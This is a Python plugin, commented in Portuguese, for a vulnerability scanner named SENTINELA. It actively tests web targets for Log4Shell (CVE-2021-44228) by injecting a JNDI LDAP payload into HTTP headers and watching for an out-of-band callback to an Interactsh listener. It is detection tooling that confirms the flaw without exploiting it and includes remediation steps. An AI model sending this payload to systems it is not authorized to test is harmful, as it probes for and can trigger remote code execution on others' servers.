#!/usr/bin/env python3
"""
Plugin SENTINELA — Teste Ativo de Log4Shell (CVE-2021-44228) via OOB
Criado por github.com/3rr0rrr

Substitui a checagem antiga por palavra-chave ("log4j" no banner) por um
teste ATIVO real: injeta payload JNDI (${jndi:ldap://...}) em headers
comuns (User-Agent, X-Forwarded-For, Referer) e em parâmetros de
formulário, usando o MESMO listener OOB (Interactsh) de
modules/oob_listener.py. Se o callback LDAP/DNS chegar, é confirmação
REAL de execução — muito mais forte que suspeita por keyword.

Injeção ativa, mesma categoria de risco de SQLi/XSS. Só roda com --sqli
OU --test-log4shell explícito. Não roda em --mode stealth. Requer OOB
disponível (sem OOB, o plugin não tem como confirmar nada e não roda).
"""

import time

from plugins.base import SentinelaPlugin

try:
    import requests
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

HEADERS_ALVO = ["User-Agent", "X-Forwarded-For", "X-Api-Version", "Referer", "X-Forwarded-Host"]
MAX_ALVOS = 6


class Log4ShellActiveTestPlugin(SentinelaPlugin):
    name           = "Teste Ativo de Log4Shell (via OOB)"
    version        = "1.0.0"
    author         = "github.com/3rr0rrr"
    description    = "Injeta payload JNDI em headers/params e confirma RCE real via callback OOB"
    requires       = ["web_analysis"]
    tags           = ["web", "log4shell", "rce", "cve-2021-44228"]
    severity       = "critical"
    enabled        = True
    stealth        = False
    min_confidence = 0.9
    max_findings   = 5
    timeout        = 60

    def run(self, target: str, context: dict) -> list:
        if not HAS_REQUESTS:
            return []

        config = context.get("config", {}) or {}
        if config.get("intensity") == "passive":
            return []
        if not (config.get("sqli") or config.get("test_log4shell")):
            return []

        oob = context.get("oob_listener")
        if not oob or not getattr(oob, "disponivel", False):
            self.log("OOB indisponível — teste de Log4Shell pulado (sem OOB não dá pra confirmar RCE cego)", "warn")
            return []

        session = self._build_session(config)
        base_urls = list(context.get("base_urls") or [f"https://{target}"])[:MAX_ALVOS]

        tags_por_url = {}
        for url in base_urls:
            callback_url = oob.gerar_payload_url(f"log4shell:{url}")
            if not callback_url:
                continue
            host_callback = callback_url.replace("http://", "").replace("https://", "").split("/")[0]
            payload = f"${{jndi:ldap://{host_callback}/a}}"

            for header in HEADERS_ALVO:
                try:
                    session.get(url, headers={header: payload},
                                timeout=config.get("timeout", 10), verify=False)
                except Exception:
                    continue
            tags_por_url[f"log4shell:{url}"] = url

        if not tags_por_url:
            return []

        time.sleep(8)  # dá tempo pro alvo resolver o LDAP/DNS e o callback chegar
        interacoes = oob.checar_interacoes()

        findings = []
        for inter in interacoes:
            url = tags_por_url.get(inter.get("tag"))
            if not url:
                continue
            f = self.finding(
                severity         = "critical",
                title            = f"Log4Shell (CVE-2021-44228) CONFIRMADO em {url}",
                detail           = (
                    f"O servidor fez uma requisição de callback ({inter.get('tipo')}) pro listener "
                    f"Interactsh após receber payload JNDI em header HTTP — confirmação REAL de "
                    f"execução, não suspeita por keyword. RCE completo é o próximo passo lógico de "
                    f"exploração (fora do escopo deste teste, que só confirma, não explora)."
                ),
                url              = url,
                evidence         = f"callback recebido de {inter.get('origem')}, protocolo {inter.get('tipo')}",
                remediation      = "Atualizar Log4j pra versão 2.17.1+ IMEDIATAMENTE. Se não for possível "
                                    "no curto prazo, definir `log4j2.formatMsgNoLookups=true` ou remover a "
                                    "classe JndiLookup do classpath como mitigação temporária.",
                confidence       = 0.98,
                impact           = 10.0,
                exploitability   = "pre-auth",
                business_context = "Log4Shell confirmado é RCE pré-autenticação — comprometimento total "
                                    "do servidor é possível. Prioridade máxima absoluta.",
            )
            if f:
                findings.append(f)
        return findings

    def _build_session(self, config: dict):
        session = requests.Session()
        session.headers.update({
            "User-Agent": config.get("user_agent",
                "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"),
        })
        if config.get("proxy"):
            session.proxies.update(config["proxy"])
        return session
